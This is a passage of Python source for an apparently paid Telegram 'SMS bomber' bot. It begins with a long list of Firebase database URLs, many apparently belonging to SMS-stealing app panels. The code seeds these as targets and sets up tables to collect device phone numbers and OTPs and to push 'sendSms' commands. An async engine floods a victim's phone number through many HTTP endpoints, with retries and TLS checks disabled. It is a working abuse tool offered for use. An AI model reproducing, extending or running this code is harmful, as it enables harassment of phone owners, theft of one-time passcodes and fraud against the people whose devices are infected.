https://sappu-e8d46-default-rtdb.firebaseio.com
https://sexypayload-default-rtdb.firebaseio.com
https://shadow-f9cd3-default-rtdb.firebaseio.com
https://smsforward-b2198.firebaseio.com
https://sonic-d5c1a-default-rtdb.firebaseio.com
https://sonu-5e324-default-rtdb.firebaseio.com
https://subhu3-9f156-default-rtdb.firebaseio.com
https://sudhir-suexs-seox-default-rtdb.firebaseio.com
https://suihd-default-rtdb.firebaseio.com
https://suman-95a0a-default-rtdb.firebaseio.com
https://suman-penal-default-rtdb.firebaseio.com
https://sunrajas-default-rtdb.firebaseio.com
https://systumm-c8526-default-rtdb.firebaseio.com
https://takul-cf410-default-rtdb.firebaseio.com
https://thanu-4174d-default-rtdb.firebaseio.com
https://tillu-2-default-rtdb.firebaseio.com
https://totla-axis-default-rtdb.firebaseio.com
https://tuuui-60b15-default-rtdb.firebaseio.com
https://ueuwuw-default-rtdb.firebaseio.com
https://upandar-bb51e-default-rtdb.firebaseio.com
https://uuuuu-ee02e-default-rtdb.firebaseio.com
https://vamprandi-default-rtdb.firebaseio.com
https://vishal-x-aravat-default-rtdb.firebaseio.com
https://vvvvv-b5eae-default-rtdb.firebaseio.com
https://yellow-pannel-dadc7-default-rtdb.firebaseio.com
https://yogeshbhaitumchutiya-default-rtdb.firebaseio.com
https://yohichahiye-default-rtdb.firebaseio.com
https://navin-9fb56-default-rtdb.firebaseio.com
https://lucifer-spreader-default-rtdb.firebaseio.com
https://ravan-98ef1-default-rtdb.firebaseio.com
https://motichur-32c54-default-rtdb.firebaseio.com
https://testuuu-f5cbb-default-rtdb.firebaseio.com
https://vikram01-c0306-default-rtdb.firebaseio.com
https://lalanashish2-default-rtdb.firebaseio.com
https://paisa-8e4f4-default-rtdb.firebaseio.com
https://lks-e2969-default-rtdb.firebaseio.com
https://e13turnament-1-default-rtdb.firebaseio.com
https://csk-70-default-rtdb.firebaseio.com
https://aaya-6e335-default-rtdb.firebaseio.com
https://project-f2fd6-default-rtdb.firebaseio.com
https://rajabhaya-default-rtdb.firebaseio.com
https://rajakk-80ecd-default-rtdb.firebaseio.com
https://miyakhalifa-143d5-default-rtdb.firebaseio.com
https://dhumm-90a53-default-rtdb.firebaseio.com
https://dharmesh-panel-default-rtdb.firebaseio.com
https://ahisjija-default-rtdb.firebaseio.com
https://kali-1b217-default-rtdb.firebaseio.com
https://tinobiggand-default-rtdb.firebaseio.com
https://admin-panel-pikachu-default-rtdb.firebaseio.com
https://pri14-b45dd-default-rtdb.firebaseio.com
https://zinga-1ae57-default-rtdb.firebaseio.com
https://badalpaji-default-rtdb.firebaseio.com
https://ramm-bac59-default-rtdb.firebaseio.com
https://csk-65-default-rtdb.firebaseio.com
https://admin-chorsala-default-rtdb.firebaseio.com
https://hunyervamp-default-rtdb.firebaseio.com
https://admin-no-43-default-rtdb.firebaseio.com
https://rajkumar-5af9d-default-rtdb.firebaseio.com
https://paro-df7ed-default-rtdb.firebaseio.com
https://vampirebhsuhan-default-rtdb.firebaseio.com
https://panel-wala-v16-default-rtdb.firebaseio.com
https://aaaa-b3749-default-rtdb.firebaseio.com
https://duuu-dc41d-default-rtdb.firebaseio.com
https://hopkhfg-9981a-default-rtdb.firebaseio.com
https://yono-sb41-default-rtdb.firebaseio.com
https://human-34-kumar-default-rtdb.firebaseio.com
https://mahanivip-kituk10-default-rtdb.firebaseio.com
https://lalannew5-default-rtdb.firebaseio.com
https://autobot-e9a28-default-rtdb.firebaseio.com
https://amit-singh-9a7d3-default-rtdb.firebaseio.com
https://aljajs-default-rtdb.firebaseio.com
https://raja-bhaiya-64-default-rtdb.firebaseio.com
https://chfjfj-c2857-default-rtdb.firebaseio.com
https://bittu-2d39e-default-rtdb.firebaseio.com
https://darknet-26b68-default-rtdb.firebaseio.com
https://pm-kishan-b4-default-rtdb.firebaseio.com
https://arvind-c5b03-default-rtdb.firebaseio.com
https://pawankumar92342038-8f702-default-rtdb.firebaseio.com
https://rto-e-chall-4-default-rtdb.firebaseio.com
https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app
https://cep10huii-default-rtdb.firebaseio.com
https://no-admin-e0a30-default-rtdb.firebaseio.com
https://virugoniya-default-rtdb.firebaseio.com
https://biharnew2-default-rtdb.firebaseio.com
https://navin512-54d6f-default-rtdb.firebaseio.com
https://totla-panel-default-rtdb.firebaseio.com
https://stprorto2sep-default-rtdb.firebaseio.com
https://dk-sut-aadmi-default-rtdb.firebaseio.com
https://rto86-feb-26-default-rtdb.firebaseio.com
https://olamigo-41620-default-rtdb.firebaseio.com
https://rontem-a082b-default-rtdb.firebaseio.com
https://pakhi-ab779-default-rtdb.firebaseio.com
https://shuyant-caab5-default-rtdb.firebaseio.com
https://ruff-panel-default-rtdb.firebaseio.com
https://nexus-84df5-default-rtdb.firebaseio.com
https://leak-nhi-hoga-default-rtdb.firebaseio.com
https://prince-cf8ae-default-rtdb.firebaseio.com
https://vfxhj-9accf-default-rtdb.firebaseio.com
https://net-c-f0054-default-rtdb.firebaseio.com
https://admi226-default-rtdb.firebaseio.com
https://ruhfyg-78198-default-rtdb.firebaseio.com
https://amitone-95490-default-rtdb.firebaseio.com
https://dark-bhai-b413b-default-rtdb.firebaseio.com
https://arjunnn-3244b-default-rtdb.firebaseio.com
https://anuj2-3ffd8-default-rtdb.firebaseio.com
https://sb-new-ro-te-apcd08-default-rtdb.firebaseio.com
https://no-admin-5f159-default-rtdb.firebaseio.com
https://sumit1-82dcd-default-rtdb.firebaseio.com
https://fir-app-pandia-default-rtdb.firebaseio.com
https://amzib-7f30b-default-rtdb.firebaseio.com
https://demonrat-aa782-default-rtdb.firebaseio.com
https://fare-ed703-default-rtdb.firebaseio.com
https://dyfufuitgi-default-rtdb.firebaseio.com
https://palms-568c7-default-rtdb.firebaseio.com
https://meeindian-default-rtdb.firebaseio.com
https://company-app-idfc-default-rtdb.firebaseio.com
https://panel-no-37-default-rtdb.firebaseio.com
https://sbi-2-monu-kunalpand-default-rtdb.firebaseio.com
https://rakesh-hgf-kunapand-default-rtdb.firebaseio.com
https://sk-boss-892b1-default-rtdb.firebaseio.com
https://silema-e4947-default-rtdb.firebaseio.com
https://web-ka-2-default-rtdb.firebaseio.com
https://rto12-b14f6-default-rtdb.firebaseio.com
https://hazma-admin-4-default-rtdb.firebaseio.com
https://mpari420-7bb01-default-rtdb.firebaseio.com
https://yadav-b174a-default-rtdb.firebaseio.com
https://testing-81627-default-rtdb.firebaseio.com
https://zamzam-baba77-default-rtdb.firebaseio.com
https://raj-londa-49db5-default-rtdb.firebaseio.com
https://vish-4a6de-default-rtdb.firebaseio.com
https://rason00-default-rtdb.firebaseio.com
https://vijay-afb12-default-rtdb.firebaseio.com
https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com
https://ramu-c81a7-default-rtdb.firebaseio.com
https://sinu-ji99-default-rtdb.firebaseio.com
https://nidhi-rani-default-rtdb.firebaseio.com
https://lolippanel-default-rtdb.firebaseio.com
https://loddysingh-6d511-default-rtdb.firebaseio.com
https://ppoi02-default-rtdb.firebaseio.com
https://expert-5e1a0-default-rtdb.firebaseio.com
https://cousetemer-support-12e40-default-rtdb.firebaseio.com
https://metabank-3def8-default-rtdb.firebaseio.com
https://tinku3-63de9-default-rtdb.firebaseio.com
https://tinobiggan-default-rtdb.firebaseio.com
https://jake-11674-default-rtdb.firebaseio.com
https://botsieeee-af07c-default-rtdb.firebaseio.com
https://subhash-45fb2-default-rtdb.firebaseio.com
https://kartik-c66a5-default-rtdb.firebaseio.com
https://soni-bbb64-default-rtdb.firebaseio.com
https://rahu-96df7-default-rtdb.firebaseio.com
https://arrun01-b1ece-default-rtdb.firebaseio.com
https://krishna4343-e45fd-default-rtdb.firebaseio.com
https://zxcvbnm-13fb3-default-rtdb.firebaseio.com
https://uffuuf-d1a3c-default-rtdb.firebaseio.com
https://moneyking-47-default-rtdb.firebaseio.com
https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app
https://rohitbona-d8308-default-rtdb.firebaseio.com
https://vempire1-e132b-default-rtdb.firebaseio.com
https://randipelega-default-rtdb.firebaseio.com
https://abhirt-58f65-default-rtdb.firebaseio.com
https://adityakaapp-default-rtdb.firebaseio.com
https://baba-tillu-2-default-rtdb.firebaseio.com
https://sonuganduu-9d4da-default-rtdb.firebaseio.com
https://cs36-1c5d3-default-rtdb.firebaseio.com
https://atifgndu-default-rtdb.firebaseio.com
https://iiilsoee-default-rtdb.firebaseio.com
https://ubhanhazx-default-rtdb.firebaseio.com
https://world-6b099-default-rtdb.firebaseio.com
https://lucky-c0915-default-rtdb.firebaseio.com
https://nowammyxdd-default-rtdb.firebaseio.com
https://neni-7fbe7-default-rtdb.firebaseio.com
https://gadhalalund-default-rtdb.firebaseio.com
https://commotazee-darkness-default-rtdb.firebaseio.com
https://aditya-9f66b-default-rtdb.firebaseio.com
https://krish-gana-default-rtdb.firebaseio.com
https://arjun-singh-43d2f-default-rtdb.firebaseio.com
https://amaat-a7916-default-rtdb.firebaseio.com
https://dinu-ji99-default-rtdb.firebaseio.com
https://e8383jsndn-default-rtdb.firebaseio.com
https://mr-dr-72761-default-rtdb.firebaseio.com
https://courier40-30jan-default-rtdb.firebaseio.com
https://rkriya-bhaiakhane7-default-rtdb.firebaseio.com
https://bega-8457c-default-rtdb.firebaseio.com
https://itslooksexp-default-rtdb.firebaseio.com
https://panelwalababa-ddd53-default-rtdb.firebaseio.com
https://bali-7acc3-default-rtdb.firebaseio.com
https://family-shield-48fdb-default-rtdb.firebaseio.com
https://amit-6f40a-default-rtdb.firebaseio.com
https://paanaal-default-rtdb.asia-southeast1.firebasedatabase.app
https://faak-9cb47-default-rtdb.firebaseio.com
https://priya-cfdb7-default-rtdb.firebaseio.com
https://ajaykumar-61773-default-rtdb.firebaseio.com
https://fixhogya-5b6e3-default-rtdb.firebaseio.com
https://usa-n-landon-default-rtdb.firebaseio.com
https://levi-67f75-default-rtdb.firebaseio.com
https://brodj-162c6-default-rtdb.firebaseio.com
https://vijayda-default-rtdb.firebaseio.com
https://fogda-f8255-default-rtdb.firebaseio.com
https://lol40-5bab7-default-rtdb.firebaseio.com
https://tabuna-4e962-default-rtdb.firebaseio.com
https://raj-admin-nokia-default-rtdb.firebaseio.com
https://raj-parsonal-default-rtdb.firebaseio.com
https://tested-d85ca-default-rtdb.firebaseio.com
https://admin-98208-default-rtdb.firebaseio.com
https://axayyyyyy-default-rtdb.firebaseio.com
https://styles-girl-d7617-default-rtdb.firebaseio.com
https://mafiaaaa2oppp-default-rtdb.firebaseio.com
https://chhgg-dc213-default-rtdb.firebaseio.com
https://jannu-c03ea-default-rtdb.firebaseio.com
https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com
https://e3turnament11-default-rtdb.firebaseio.com
https://aashish-2e04c-default-rtdb.firebaseio.com
https://kishm-1d858-default-rtdb.firebaseio.com
https://phone55-d7d89-default-rtdb.firebaseio.com
https://cjarkuadmin-default-rtdb.firebaseio.com
https://my-penel-maxjoker98-default-rtdb.firebaseio.com
https://admin-39ss-default-rtdb.firebaseio.com
https://premmiiii-default-rtdb.firebaseio.com
https://rambhai-45c3a-default-rtdb.firebaseio.com
https://sanjana-admin-panel-default-rtdb.firebaseio.com
https://shankar-tipul-default-rtdb.firebaseio.com
https://chutiya-136fc-default-rtdb.firebaseio.com
https://heisenberg-8c3da-default-rtdb.firebaseio.com
https://aujla-afe1a-default-rtdb.firebaseio.com
https://arifyellow-efd98-default-rtdb.firebaseio.com
https://rantuwnzusjsjsndhej6sb-default-rtdb.firebaseio.com
https://cogulent-default-rtdb.firebaseio.com
https://rnd5-d583f-default-rtdb.firebaseio.com
https://ranu-e604c-default-rtdb.firebaseio.com
https://sbi-project-fcfba-default-rtdb.firebaseio.com
https://room-29b11-default-rtdb.firebaseio.com
https://boby-panel-yellow-ashe-default-rtdb.firebaseio.com
https://ak-47-93ca8-default-rtdb.firebaseio.com
https://khanipanel-d58cf-default-rtdb.firebaseio.com
https://desert-fc320-default-rtdb.firebaseio.com
https://xxxxz-2e129-default-rtdb.firebaseio.com
https://maxy1213-31346-default-rtdb.firebaseio.com
https://kichudjdudh-default-rtdb.firebaseio.com
https://ramesh-67a2b-default-rtdb.firebaseio.com
https://adpanel37-default-rtdb.firebaseio.com
https://adminpc-4e6a9-default-rtdb.firebaseio.com
https://amulyaji8080-default-rtdb.firebaseio.com
https://asop-8630f-default-rtdb.firebaseio.com
https://panel-jack-default-rtdb.firebaseio.com
https://atifold-d560e-default-rtdb.firebaseio.com
https://amkashb-3ec3c-default-rtdb.firebaseio.com
https://blrm-c65dd-default-rtdb.firebaseio.com
https://rojam-ff090-default-rtdb.firebaseio.com
https://jdjfjiiii-default-rtdb.firebaseio.com
https://maxjoker98-2cdfe-default-rtdb.firebaseio.com
https://freefire-c51f2-default-rtdb.firebaseio.com
https://xiaoms-6c15b-default-rtdb.firebaseio.com
https://raj-panel-3e09a-default-rtdb.firebaseio.com
https://rajcom-92cc6-default-rtdb.firebaseio.com
https://e5turnament5-default-rtdb.firebaseio.com
https://deepakdblprn-default-rtdb.firebaseio.com
https://e31turnament1-default-rtdb.firebaseio.com
https://mi-admin-7c5f0-default-rtdb.firebaseio.com
https://king-simgh-default-rtdb.firebaseio.com
https://kumar-8f205-default-rtdb.firebaseio.com
https://subhuapril-8932a-default-rtdb.firebaseio.com
https://r123ty-c2b48-default-rtdb.firebaseio.com
https://absbsb-73abb-default-rtdb.firebaseio.com
https://pikachu-panel-default-rtdb.firebaseio.com
https://sachin-5d8c3-default-rtdb.firebaseio.com
https://raju-7f9f8-default-rtdb.firebaseio.com
https://amit-2afcb-default-rtdb.firebaseio.com
https://apun-e55af-default-rtdb.firebaseio.com
https://project3-21573-default-rtdb.firebaseio.com
https://rana-hu-default-rtdb.firebaseio.com
https://rockey-8b546-default-rtdb.firebaseio.com
https://shuyant-caab5-default-rtdb.firebaseio.com
https://ankit-raj-chutiya-default-rtdb.firebaseio.com
https://scamwala-banda-default-rtdb.firebaseio.com
https://ramu-c81a7-default-rtdb.firebaseio.com
https://radhe-penal-default-rtdb.firebaseio.com
https://punj-admin-panel-default-rtdb.firebaseio.com
https://anmol-62196-default-rtdb.firebaseio.com
https://xxxx-e322a-default-rtdb.firebaseio.com
https://harami-fe6e1-default-rtdb.firebaseio.com
https://annu-5e84c-default-rtdb.firebaseio.com
https://ssssss-52f85-default-rtdb.firebaseio.com
https://ramjidost-default-rtdb.firebaseio.com
https://mopsgsh-default-rtdb.firebaseio.com
https://kingu8-73ebe-default-rtdb.firebaseio.com
https://saket-2-default-rtdb.firebaseio.com
https://pm280reolc-default-rtdb.firebaseio.com
https://jchchc-5f16d-default-rtdb.firebaseio.com
https://rama-614d4-default-rtdb.firebaseio.com
https://saiyaraaa-ee8c4-default-rtdb.firebaseio.com
https://rajxgvxb-default-rtdb.firebaseio.com
https://kammarene-default-rtdb.firebaseio.com
https://naina-singh-default-rtdb.firebaseio.com
https://hshshhs-51f68-default-rtdb.firebaseio.com
https://dabu-a08f4-default-rtdb.firebaseio.com
https://gautam-febce-default-rtdb.firebaseio.com
https://taetan-d810f-default-rtdb.firebaseio.com
https://myname-cc45a-default-rtdb.firebaseio.com
https://amit-ka-71-default-rtdb.firebaseio.com
https://barbie-69828-default-rtdb.firebaseio.com
https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com
https://room-hotel-default-rtdb.firebaseio.com
https://rdkkk-a6706-default-rtdb.firebaseio.com
https://babuji-efd18-default-rtdb.firebaseio.com
https://callmevillen12-default-rtdb.firebaseio.com
https://fir-15bee-default-rtdb.firebaseio.com
https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app
https://fwwg-d04bc-default-rtdb.firebaseio.com
https://sunil-da-default-rtdb.firebaseio.com
https://jime-10a55-default-rtdb.firebaseio.com
https://alok5u2-default-rtdb.firebaseio.com
https://rk-panell-default-rtdb.firebaseio.com
https://kunal-86274-default-rtdb.firebaseio.com
https://subjuoeh-default-rtdb.firebaseio.com
https://saaasaa-c28c1-default-rtdb.firebaseio.com
https://rama-eb8cc-default-rtdb.firebaseio.com
https://bomber-update-default-rtdb.firebaseio.com
""".strip()


# ─────────────────────────────────────────────────────────────
# SEED HELPERS
# ─────────────────────────────────────────────────────────────
def _body_to_string(d):
    if d is None:
        return ""
    if isinstance(d, str):
        return d
    if isinstance(d, dict):
        if "_raw" in d:
            return str(d["_raw"])
        return json.dumps(d, separators=(",", ":"), ensure_ascii=False)
    return str(d)


def _headers_to_string(h):
    if not h:
        return ""
    if isinstance(h, str):
        return h
    return "\n".join(f"{k}: {v}" for k, v in h.items())


def seed_all_endpoints(force_refresh=False):
    added = 0
    for name, cat, method, url, headers, body in MASTER_ENDPOINTS:
        if not force_refresh and _exec("SELECT 1 FROM apis WHERE name=?",
                                       (name,), fetch="one"):
            continue
        if force_refresh:
            _exec("DELETE FROM apis WHERE name=?", (name,))
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", cat, url, method,
               _body_to_string(body), _headers_to_string(headers),
               1, int(time.time())))
        added += 1
    log.info("seed: +%d endpoints", added)


def _norm_fb_url(url):
    url = url.strip()
    if not url:
        return ""
    if "?" in url:
        url = url.split("?", 1)[0]
    url = url.rstrip("/")
    if url and not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def seed_firebase(force_refresh=False):
    seen = set()
    added = 0
    skip = (
        "https://console.firebase.google.com",
        "https://test.firebaseio.com",
        "https://test-firebase.firebaseio.com",
        "https://db-name.firebaseio.com",
        "https://your-project-id-default-rtdb.firebaseio.com",
    )
    for raw in FIREBASE_URLS_RAW.splitlines():
        url = _norm_fb_url(raw)
        if not url or url in seen:
            continue
        seen.add(url)
        if url in skip:
            continue
        exists = _exec("SELECT 1 FROM firebase_targets WHERE url=?",
                       (url,), fetch="one")
        if exists and not force_refresh:
            continue
        try:
            host = url.split("//", 1)[1].rstrip("/")
        except Exception:
            host = url
        name = host[:120]
        clash = _exec("SELECT 1 FROM firebase_targets WHERE name=?",
                      (name,), fetch="one")
        if clash:
            name = name[:100] + "_" + str(abs(hash(url)))[:8]
        try:
            _exec("INSERT OR IGNORE INTO firebase_targets(name,url,active,"
                  "created_at) VALUES(?,?,1,?)",
                  (name, url, int(time.time())))
            added += 1
        except Exception:
            pass
    log.info("firebase seed: +%d targets", added)


# ─────────────────────────────────────────────────────────────
# INIT DB
# ─────────────────────────────────────────────────────────────
def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id       INTEGER PRIMARY KEY,
        username      TEXT,
        first_name    TEXT,
        credits       INTEGER DEFAULT 0,
        coins         INTEGER DEFAULT 0,
        banned        INTEGER DEFAULT 0,
        lifetime      INTEGER DEFAULT 0,
        last_bomb     INTEGER DEFAULT 0,
        total_bombs   INTEGER DEFAULT 0,
        total_sent    INTEGER DEFAULT 0,
        total_pushes  INTEGER DEFAULT 0,
        last_daily    INTEGER DEFAULT 0,
        referred_by   INTEGER,
        ref_count     INTEGER DEFAULT 0,
        created_at    INTEGER
    );
    CREATE TABLE IF NOT EXISTS admins (
        user_id    INTEGER PRIMARY KEY,
        added_by   INTEGER,
        added_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code        TEXT PRIMARY KEY,
        amount      INTEGER NOT NULL,
        currency    TEXT DEFAULT 'credits',
        max_uses    INTEGER NOT NULL,
        used        INTEGER DEFAULT 0,
        created_by  INTEGER,
        created_at  INTEGER,
        active      INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code     TEXT,
        user_id  INTEGER,
        used_at  INTEGER,
        PRIMARY KEY (code, user_id)
    );
    CREATE TABLE IF NOT EXISTS apis (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        name         TEXT UNIQUE,
        channel      TEXT DEFAULT 'http',
        category     TEXT DEFAULT 'legacy',
        url          TEXT NOT NULL,
        method       TEXT DEFAULT 'GET',
        body         TEXT DEFAULT '',
        headers      TEXT DEFAULT '',
        active       INTEGER DEFAULT 1,
        fail_streak  INTEGER DEFAULT 0,
        ok_count     INTEGER DEFAULT 0,
        fail_count   INTEGER DEFAULT 0,
        created_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS bomb_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        ok       INTEGER,
        fail     INTEGER,
        category TEXT,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS blacklist (
        target   TEXT PRIMARY KEY,
        added_by INTEGER,
        added_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        action   TEXT,
        detail   TEXT,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS firebase_targets (
        id                 INTEGER PRIMARY KEY AUTOINCREMENT,
        name               TEXT UNIQUE,
        url                TEXT UNIQUE,
        active             INTEGER DEFAULT 1,
        device_count       INTEGER DEFAULT 0,
        otp_count          INTEGER DEFAULT 0,
        online_count       INTEGER DEFAULT 0,
        total_count        INTEGER DEFAULT 0,
        reachable          INTEGER DEFAULT 0,
        last_scan          INTEGER DEFAULT 0,
        last_error         TEXT DEFAULT '',
        discovered_tree    TEXT DEFAULT '',
        devices_node       TEXT DEFAULT 'clients',
        messages_node      TEXT DEFAULT 'messages',
        send_node          TEXT DEFAULT 'webhookEvent/sendSms',
        push_ok            INTEGER DEFAULT 0,
        push_fail          INTEGER DEFAULT 0,
        created_at         INTEGER
    );
    CREATE TABLE IF NOT EXISTS firebase_devices (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        firebase_id INTEGER,
        device_key  TEXT,
        phone       TEXT,
        info        TEXT,
        otp         TEXT,
        path        TEXT,
        last_seen   INTEGER,
        UNIQUE(firebase_id, device_key)
    );
    CREATE TABLE IF NOT EXISTS firebase_test_ids (
        slot        INTEGER PRIMARY KEY,
        firebase_id INTEGER,
        device_key  TEXT,
        added_at    INTEGER
    );
    """)

    if not _col_exists("users", "coins"):
        _conn.execute("ALTER TABLE users ADD COLUMN coins INTEGER DEFAULT 0")
    if not _col_exists("users", "lifetime"):
        _conn.execute("ALTER TABLE users ADD COLUMN lifetime INTEGER DEFAULT 0")
    if not _col_exists("users", "total_sent"):
        _conn.execute("ALTER TABLE users ADD COLUMN total_sent INTEGER DEFAULT 0")
    if not _col_exists("users", "total_pushes"):
        _conn.execute("ALTER TABLE users ADD COLUMN total_pushes INTEGER DEFAULT 0")
    if not _col_exists("redeem_codes", "currency"):
        _conn.execute("ALTER TABLE redeem_codes ADD COLUMN currency TEXT DEFAULT 'credits'")
    for col, ddl in (
        ("discovered_tree", "ALTER TABLE firebase_targets ADD COLUMN discovered_tree TEXT DEFAULT ''"),
        ("devices_node",    "ALTER TABLE firebase_targets ADD COLUMN devices_node TEXT DEFAULT 'clients'"),
        ("messages_node",   "ALTER TABLE firebase_targets ADD COLUMN messages_node TEXT DEFAULT 'messages'"),
        ("send_node",       "ALTER TABLE firebase_targets ADD COLUMN send_node TEXT DEFAULT 'webhookEvent/sendSms'"),
        ("online_count",    "ALTER TABLE firebase_targets ADD COLUMN online_count INTEGER DEFAULT 0"),
        ("total_count",     "ALTER TABLE firebase_targets ADD COLUMN total_count INTEGER DEFAULT 0"),
    ):
        try:
            if not _col_exists("firebase_targets", col):
                _conn.execute(ddl)
        except Exception:
            pass

    for key, val in (
        ("cost_per_min",     DEFAULT_COST_PER_MIN),
        ("lifetime_cost",    DEFAULT_LIFETIME_COST),
        ("cooldown",         DEFAULT_COOLDOWN),
        ("concurrency",      DEFAULT_CONCURRENCY),
        ("daily_bonus",      DEFAULT_DAILY_BONUS),
        ("referral_bonus",   REFERRAL_BONUS),
        ("maintenance",      0),
        ("country_code",     "91"),
        ("coin_cost",        DEFAULT_COIN_COST),
    ):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (key, str(val)))

    if _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"] == 0:
        for uid in ADMIN_IDS_ENV:
            _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
                  "VALUES(?,?,?)", (uid, 0, int(time.time())))

    seed_all_endpoints()
    seed_firebase()


# ─────────────────────────────────────────────────────────────
# SETTINGS / UTIL
# ─────────────────────────────────────────────────────────────
def setting(key, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(key, value):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
          (key, str(value)))


def gen_code(n=10):
    return "".join(secrets.choice(string.ascii_uppercase + string.digits)
                   for _ in range(n))


def is_admin(uid):
    return _exec("SELECT 1 FROM admins WHERE user_id=?",
                 (uid,), fetch="one") is not None


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?",
                 (target,), fetch="one") is not None


def fmt_target(raw, category):
    digits = "".join(c for c in raw if c.isdigit())
    if category == "legacy":
        if len(digits) > 10:
            digits = digits[-10:]
        return digits
    if len(digits) == 10:
        digits = setting("country_code") + digits
    return digits


# ─────────────────────────────────────────────────────────────
# USER CRUD
# ─────────────────────────────────────────────────────────────
def get_user(uid):
    return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u: types.User, referrer=None):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,coins,"
              "referred_by,created_at) VALUES(?,?,?,0,0,?,?)",
              (u.id, u.username or "", u.first_name or "",
               referrer, int(time.time())))
        if referrer and referrer != u.id:
            bonus = setting("referral_bonus", int)
            if not is_admin(referrer):
                add_credits(referrer, bonus)
            _exec("UPDATE users SET ref_count=ref_count+1 WHERE user_id=?",
                  (referrer,))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    if is_admin(uid):
        return True
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits=credits-? WHERE user_id=? AND credits>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


def add_coins(uid, amount):
    _exec("UPDATE users SET coins=coins+? WHERE user_id=?", (amount, uid))


def take_coins(uid, amount):
    if is_admin(uid):
        return True
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET coins=coins-? WHERE user_id=? AND coins>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail[:500], int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


# ─────────────────────────────────────────────────────────────
# MIDDLEWARE
# ─────────────────────────────────────────────────────────────
class AutoRegisterMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot:
            ensure_user(u)
        return await handler(event, data)


# ─────────────────────────────────────────────────────────────
# SMS BOMBER ENGINE
# ─────────────────────────────────────────────────────────────
def _render(template, target, msg):
    if not template:
        return ""
    return (template
            .replace("{target}", target)
            .replace("{phone}", target)
            .replace("{msg}", msg))


def _parse_headers(raw):
    out = {}
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, row, target, msg):
    url = _render(row["url"], target, msg)
    method = (row["method"] or "GET").upper()
    body = _render(row["body"], target, msg)
    headers = _parse_headers(row["headers"])
    headers.setdefault("User-Agent", USER_AGENT)
    headers.setdefault("Accept", "*/*")
    headers.setdefault("Accept-Language", "en-IN,en;q=0.9")
    timeout = aiohttp.ClientTimeout(total=HTTP_TIMEOUT_TOTAL,
                                    connect=HTTP_TIMEOUT_CONNECT)

    async def attempt():
        try:
            data_bytes = body.encode("utf-8") if body else None
            if method == "POST":
                async with session.post(url, data=data_bytes,
                                        headers=headers,
                                        timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
            elif method == "PUT":
                async with session.put(url, data=data_bytes,
                                       headers=headers,
                                       timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
            else:
                async with session.get(url, headers=headers,
                                       timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
        except Exception:
            return 0

    status = await attempt()
    if 200 <= status < 400:
        return True
    if status in (429, 500, 502, 503, 504):
        await asyncio.sleep(0.4)
        status = await attempt()
        if 200 <= status < 400:
            return True
    return False


def _update_api_health(api_id, ok):
    try:
        if ok:
            _exec("UPDATE apis SET ok_count=ok_count+1, fail_streak=0 "
                  "WHERE id=?", (api_id,))
        else:
            _exec("UPDATE apis SET fail_count=fail_count+1, "
                  "fail_streak=fail_streak+1 WHERE id=?", (api_id,))
            r = _exec("SELECT fail_streak FROM apis WHERE id=?",
                      (api_id,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE apis SET active=0 WHERE id=?", (api_id,))
    except Exception:
        pass


async def run_bomber(target, duration_sec, stop_ev, progress_cb=None):
    apis = _exec("SELECT * FROM apis WHERE active=1 AND channel='http'",
                 fetch="all")
    if not apis:
        return 0, 0, "no active endpoints"

